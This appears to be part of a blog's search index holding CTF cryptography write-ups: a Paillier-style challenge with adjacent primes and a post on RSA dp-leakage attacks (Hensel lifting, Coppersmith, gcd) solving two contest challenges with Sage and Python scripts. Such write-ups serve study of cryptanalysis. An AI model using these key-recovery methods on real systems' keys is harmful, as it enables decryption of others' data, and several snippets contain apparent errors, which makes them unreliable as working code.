<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> gmpy2 <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> flag <span class="keyword">import</span> flag, p, q</span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"></span><br><span class="line">p = getPrime(<span class="number">512</span>)</span><br><span class="line">q = next_prime(p)</span><br><span class="line"></span><br><span class="line">n = p*q</span><br><span class="line">g = n + <span class="number">1</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;n = &#x27;</span> + <span class="built_in">str</span>(n))</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;g = &#x27;</span> + <span class="built_in">str</span>(g))</span><br><span class="line"></span><br><span class="line">r = random.randint(<span class="number">1</span>, n)</span><br><span class="line"><span class="keyword">assert</span> gcd(r, n) == <span class="number">1</span></span><br><span class="line"></span><br><span class="line">m = bytes_to_long(flag)</span><br><span class="line">c = (<span class="built_in">pow</span>(g, m, n*n) * <span class="built_in">pow</span>(r, n, n*n)) % (n*n)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;c = &#x27;</span> + <span class="built_in">str</span>(c))</span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">n, g, c</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br></pre></td></tr></table></figure>
<p>Follow the <strong>PROOF</strong>, and we can write scripts to decrypt.</p>
]]></content>
      <categories>
        <category>Crypto</category>
      </categories>
      <tags>
        <tag>fermat_little_theorem</tag>
        <tag>proof</tag>
        <tag>ruler</tag>
      </tags>
  </entry>
  <entry>
    <title>Weekly-Descriptions-About-Crypto</title>
    <url>/2023/02/22/weekly-descriptions-about-crypto/</url>
    <content><![CDATA[<p>The <code>dp_leakage</code> in RSA attacks, the post will introduce some extensions about the <code>dp_leakage</code>, using the example <code>[2020YCB]Power</code>.</p>
<p>Next part will resolve the <code>[2022MIMIC]cry1</code> which is more easier than the former wp. The former by using <code>polynomial</code>, the latter by using <code>math deduction</code> with <code>fermat_little_theorem</code>.</p>
<p>Both of them will be given full solutions and comparison.</p>
<span id="more"></span><!--toc-->
<h1>DP_LEAKAGE_EXTENSIONS</h1>
<h2 id="EX1-n-p-b-cdot-q">EX1: $n = p^{b}\cdot q$</h2>
<blockquote>
<p>[2020YCB]Power</p>
</blockquote>
<img src="/2023/02/22/weekly-descriptions-about-crypto/hense_lifting.png" class="" title="hense_lifting">
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">dp_hensel</span>(<span class="params">c, e, dp, p, b</span>):</span><br><span class="line">    <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    :param b: p^b*q</span></span><br><span class="line"><span class="string">    :return: m</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line">    mp_ = <span class="built_in">pow</span>(c, dp, p)</span><br><span class="line">    mp = <span class="built_in">pow</span>(c, dp - <span class="number">1</span>, p)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, b - <span class="number">2</span>):</span><br><span class="line">        x = <span class="built_in">pow</span>(c - <span class="built_in">pow</span>(mp_, e), <span class="number">1</span>, p**(i + <span class="number">1</span>))</span><br><span class="line">        y = <span class="built_in">pow</span>(x * mp * invert(e, p), <span class="number">1</span>, p**(i + <span class="number">1</span>))</span><br><span class="line">        mp_ = mp_ + y</span><br><span class="line">    <span class="keyword">return</span> mp_</span><br></pre></td></tr></table></figure>
<h2 id="EX2-Coppersmith-attack-know-dp-high">EX2: Coppersmith attack, know dp high</h2>
<blockquote>
<p>[qwb2019]Coppersmith</p>
</blockquote>
<img src="/2023/02/22/weekly-descriptions-about-crypto/coppersmith-high.png" class="">
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#Sage</span><br><span class="line">dp0 = </span><br><span class="line">e = </span><br><span class="line">n = </span><br><span class="line"></span><br><span class="line">F.&lt;x&gt; = PolynomialRing(Zmod(n))</span><br><span class="line">d = inverse_mod(e, n)</span><br><span class="line">for k in range(1, e):</span><br><span class="line">	f = (secret &lt;&lt; 200) + x + (k - 1) * d # 200 editable</span><br><span class="line">	x0 = f.small_roots(X=2 ** (200 + 1), beta=0.44, epsilon=1/32)</span><br><span class="line">	if len(x0) != 0:</span><br><span class="line">		dp = x0[0] + (secret &lt;&lt; 200)</span><br><span class="line">		for i in range(2, e):</span><br><span class="line">			p = (e * Integer(dp) - 1 + i) // i</span><br><span class="line">			if n % p == 0:</span><br><span class="line">				break</span><br><span class="line">		if p &lt; 0:</span><br><span class="line">			continue</span><br><span class="line">		else:</span><br><span class="line">			print(&#x27;k = &#x27;,k)</span><br><span class="line">			print(&#x27;p = &#x27;,p)</span><br><span class="line">			print(&#x27;dp = &#x27;,dp)</span><br><span class="line">			break</span><br></pre></td></tr></table></figure>
<h2 id="EX3-p-gcd-m-e-cdot-dp-m-n">EX3: $p = gcd(m^{e\cdot dp} - m, n)$</h2>
<img src="/2023/02/22/weekly-descriptions-about-crypto/gcd.png" class="">
<h2 id="TBC">TBC</h2>
<h1>[2020YCB]Power</h1>
<p><a href="weekly-descriptions-about-crypto/Power.py">Power.py</a></p>
<h2 id="factorize-n-to-get-p">factorize $n$ to get $p$</h2>
<h3 id="solution1-limit">solution1-limit</h3>
<p><strong>Use the bit_length of $p$ to limit.</strong> We can get the equation of $num = dp \times e - 1$, and the num’s bit_length is 526, meaning that num contains some excess factors. We divide these small factors and we will get the true $p$, whose bit_length is 512.</p>
<p>We use <code>yafu</code> to make a factorization.</p>
<p><strong>Deduction:</strong><br>
$$<br>
\varphi(n) = lcm(p-1, q-1) = k_1(p-1) \cdot k_2(q-1)<br>
$$</p>
<p>$$<br>
d \times e \equiv 1 \mod \varphi(n) \equiv 1 \mod (p-1)<br>
$$</p>
<p>$$<br>
dp \equiv d \mod (p-1)<br>
$$</p>
<p>$$<br>
\Longrightarrow dp\times e \equiv 1 \mod (p-1)<br>
$$</p>
<p>Meaning that $num = dp \times e - 1 = k(p-1)$, we limit the bit_length to 512, and we will get the key equation of $p = num + 1$</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">factor:</span></span><br><span class="line"><span class="string">P1 = 2 # 1 digits</span></span><br><span class="line"><span class="string">P1 = 2</span></span><br><span class="line"><span class="string">P1 = 2</span></span><br><span class="line"><span class="string">P2 = 11 # 2</span></span><br><span class="line"><span class="string">P4 = 7411 # 4</span></span><br><span class="line"><span class="string">P14 = 10402958442703 # 14</span></span><br><span class="line"><span class="string">P17 = 25388174482857437 # 17</span></span><br><span class="line"><span class="string">P23 = 19976951634728916570101 # 23</span></span><br><span class="line"><span class="string">P33 = 121098273308863403811867260913043 # 33</span></span><br><span class="line"><span class="string">P69 = 514664028984426592785192432611128951474323755859087258008037664208623 # 69</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line">p = num // <span class="number">7411</span> // <span class="number">2</span> // <span class="number">2</span> + <span class="number">1</span></span><br><span class="line"><span class="comment"># judgement conditions</span></span><br><span class="line"><span class="comment"># 1. the bit_length 512 ?</span></span><br><span class="line"><span class="comment"># 2. p is prime ?</span></span><br></pre></td></tr></table></figure>
<h3 id="solution2-root">solution2-root</h3>
<p><strong>Use the equation of $x = 2019\times p^{2} + 2020\times p^{3} + 2021\times p^{4}$ ,  which is given by <code>Power.py</code> .</strong>  We can also see clearly from the <code>Power.py</code> that it use <code>discrete log</code> to generate $g_1$, by using $x, y, g$.</p>
<p>So the steps to solve $p$:</p>
<ul>
<li><strong><code>discrete_log(y, c1, g)</code> to solve out $x$</strong> (more important)</li>
<li><code>equations</code> to solve out $p$, the root of the equation is $p$</li>
</ul>
<p><em>The real $p$ is defined in $GF(y)$</em></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># step1</span><br><span class="line">x = discrete_log(y, c1, g)</span><br><span class="line"># x =</span><br><span class="line"></span><br><span class="line"># step2</span><br><span class="line">p = var(&#x27;p&#x27;)</span><br><span class="line">R.&lt;p&gt; = PolynomialRing(GF(y))</span><br><span class="line">f = 2019*p**2 + 2020*p**3 + 2021*p**4 - x</span><br><span class="line">f.roots()</span><br><span class="line"># p = </span><br></pre></td></tr></table></figure>
<h3 id="solution3-crack">solution3-crack</h3>
<p>Just crack by using the $dp, e, x, y, c1$.</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">for</span> x <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,e+<span class="number">1</span>):</span><br><span class="line">    <span class="keyword">if</span> (dp*e-<span class="number">1</span>)%x==<span class="number">0</span>:</span><br><span class="line">        p=(dp*e-<span class="number">1</span>)//x+<span class="number">1</span></span><br><span class="line">        x = <span class="number">2019</span>*p**<span class="number">2</span> + <span class="number">2020</span>*p**<span class="number">3</span> + <span class="number">2021</span>*p**<span class="number">4</span></span><br><span class="line">        <span class="keyword">if</span> c1 == <span class="built_in">pow</span>(g, x, y):</span><br><span class="line">            <span class="built_in">print</span>(p)</span><br><span class="line">            <span class="keyword">break</span></span><br></pre></td></tr></table></figure>
<h2 id="solve-out-m">solve out $m$</h2>
<h3 id="solution1-deduce">solution1-deduce</h3>
<p><strong>Use <code>fermat_little_theorem</code> to deduce.</strong> From the definition of $c$.<br>
$$<br>
c \equiv m^{e} \mod n<br>
$$</p>
<p>$$<br>
dp \equiv d \mod (p-1)<br>
$$</p>
<p>$$<br>
\rightarrow c^{dp} \equiv m^{dp \cdot e}\mod n<br>
$$</p>
<p>$$<br>
\Longrightarrow \exists k \in \mathbb{Z}, c^{dp}\mod p = m^{k\cdot (p-1) + 1} \mod p<br>
$$</p>
<p><code>Fermat's little theorem</code> can get the equation of $m^{\varphi§}\mod p \equiv 1$.<br>
$$<br>
\Longrightarrow m \cdot m^{k\cdot(p-1)}\mod p \equiv c^{dp} \mod p<br>
$$</p>
<p>$$<br>
\Longrightarrow m \equiv c^{dp} \mod p<br>
$$</p>
<p>So we can run this easy code to get $m$.</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">m = <span class="built_in">pow</span>(c, dp, p)</span><br></pre></td></tr></table></figure>
<h3 id="solution2-hensel">solution2-hensel</h3>
<p><strong>The $n = p^{4}\times q$</strong>, which is satisfied the <code>hensel_lifting scheme</code>. The $b$ is 4.</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">m = <span class="built_in">int</span>(dp_hensel(c, e, dp, p, b))</span><br></pre></td></tr></table></figure>
<p>Over~</p>
<h1>[2022MIMIC]cry1</h1>
<p><a href="weekly-descriptions-about-crypto/cry1.py">cry1.py</a></p>
<blockquote>
<p>references:</p>
<ul>
<li>V&amp;N2020 Fast</li>
<li>REDHAT2019 Related</li>
</ul>
</blockquote>
<h2 id="part1">part1</h2>
<p>To solve out the $p$ and $q$, we ought to make a deduction about the encrypt code.</p>
<p><strong>Known:</strong><br>
$$<br>
g_1 = g^{(p-1) \cdot r_1}\mod p<br>
$$</p>
<p>$$<br>
c_1 \equiv (m \times g_1^{s_1} \mod N )\mod N<br>
$$</p>
<p><strong>Deduction:</strong> <code>fermat_little_theorem</code><br>
$$<br>
g_1 = g^{(p-1)\cdot r1} \mod p \equiv 1<br>
$$</p>
<p>$$<br>
\Longrightarrow g_1 - 1 = k\cdot p<br>
$$</p>
<p>The $N = p\times q$, thus we can get $p$ by $gcd(g_1-1, N)$.</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">p = gcd(g1 - <span class="number">1</span>, N)</span><br><span class="line">q = N // p</span><br></pre></td></tr></table></figure>
<h3 id="solution1-crt">solution1-crt</h3>
<p>Write the decrypt code by using <code>chinese_remainder_theorem</code>.</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">decrypt</span>(<span class="params">c1, c2, p, q</span>):</span><br><span class="line">    xp = c1 % p</span><br><span class="line">    xq = c2 % q</span><br><span class="line">    <span class="comment"># Chinese Remainder Theorem</span></span><br><span class="line">    m = (xp*invert(q, p)*q + xq*invert(p, q)*p) % (p*q)</span><br><span class="line">    <span class="keyword">return</span> m</span><br><span class="line"><span class="comment"># or sagemath-crt()</span></span><br><span class="line">m = crt([c1, c2], [p, q])</span><br></pre></td></tr></table></figure>
<h3 id="solution2-min">solution2-min</h3>
<p>$$<br>
c_1 \equiv (m \times g^{s_1 \cdot r_1  \cdot (p-1)} \mod p) \mod N\<br>
\Longrightarrow c_1 \equiv m \mod N<br>
$$</p>
<p>By equation above, we can get a simple way to solve out $m$, for that the bit_length of $m$ is short theoretically.<br>
$$<br>
m = min(c1 \mod p, c1 \mod q)<br>
$$<br>
Convert to code.</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">m = min(c1 % p, c1 % q)</span><br></pre></td></tr></table></figure>
<h2 id="part2">part2</h2>
<p>Three equations of <code>A</code>, <code>B</code>, <code>C</code>.</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">cnt = <span class="built_in">len</span>(Cs)</span><br><span class="line">A = [(i + <span class="number">128</span>)**<span class="number">2</span> <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(cnt)]</span><br><span class="line">B = [(i + <span class="number">1024</span>) <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(cnt)]</span><br><span class="line">C = [(i + <span class="number">512</span>) <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(cnt)]</span><br></pre></td></tr></table></figure>
<h3 id="solution1-Groebner-basis">solution1-Groebner_basis</h3>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">PR = PolynomialRing(Zmod(N2), <span class="string">&#x27;x&#x27;</span>, cnt)</span><br><span class="line">x = PR.gens()</span><br><span class="line">Fs = [((A[i] * x[i]**<span class="number">2</span> + B[i] * x[i] + C[i])**e - Cs[i]) <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(cnt)]</span><br><span class="line">Fs.append(x[<span class="number">0</span>] + x[<span class="number">1</span>] + x[<span class="number">2</span>] - S)</span><br><span class="line">I = Ideal(Fs)</span><br><span class="line">G_b = I.groebner_basis()</span><br><span class="line">m2 = <span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> b <span class="keyword">in</span> G_b[:-<span class="number">1</span>]:</span><br><span class="line">    mi = ZZ(-b(<span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>))</span><br><span class="line">    mi = <span class="built_in">hex</span>(mi)[<span class="number">2</span>:].strip(<span class="string">&#x27;L&#x27;</span>)</span><br><span class="line">    m2 += ((<span class="string">&#x27;&#x27;</span>, <span class="string">&#x27;0&#x27;</span>)[<span class="built_in">len</span>(mi) %<span class="number">2</span>]+mi)</span><br><span class="line"><span class="comment"># m is hex</span></span><br></pre></td></tr></table></figure>
<p>TBC~</p>
<h3 id="solution2-functions">solution2-functions</h3>
<p>We are similar to the polynomial equations, thus we make a conversion.</p>
<p>Get the quadradic equations by open to the power of e.</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">C_ = []</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> Cs:</span><br><span class="line">    C_.append(iroot(i, Cs)[<span class="number">0</span>])</span><br></pre></td></tr></table></figure>
<p>Unknown variables  $m1, m2, m3$defined on the ring of $\mathbb{Z}$ .</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">P.&lt;m1&gt; = Zmod()[]</span><br><span class="line">P.&lt;m2&gt; = Zmod()[]</span><br><span class="line">P.&lt;m3&gt; = Zmod()[]</span><br></pre></td></tr></table></figure>
<p>Substitute the former equations, and get the quadradic equations.</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">f1 = A[<span class="number">0</span>] * m1 ** <span class="number">2</span> + B[<span class="number">0</span>] * m1 + C[<span class="number">0</span>] - <span class="built_in">int</span>(C_[<span class="number">0</span>])</span><br><span class="line">f2 = A[<span class="number">1</span>] * m2 ** <span class="number">2</span> + B[<span class="number">1</span>] * m2 + C[<span class="number">1</span>] - <span class="built_in">int</span>(C_[<span class="number">1</span>])</span><br><span class="line">f3 = A[<span class="number">2</span>] * m3 ** <span class="number">2</span> + B[<span class="number">2</span>] * m3 + C[<span class="number">2</span>] - <span class="built_in">int</span>(C_[<span class="number">2</span>])</span><br></pre></td></tr></table></figure>
<p>Get the root.</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">v1 = f1.roots()</span><br><span class="line">v2 = f2.roots()</span><br><span class="line">v3 = f3.roots()</span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>Crypto</category>
      </categories>
      <tags>
        <tag>fermat_little_theorem</tag>
        <tag>RSA</tag>
        <tag>dp_leakage</tag>
        <tag>YCB</tag>
        <tag>MIMIC</tag>
        <tag>chinese_remainder_theorem</tag>
        <tag>Groebner_basis</tag>
      </tags>
  </entry>
</search>
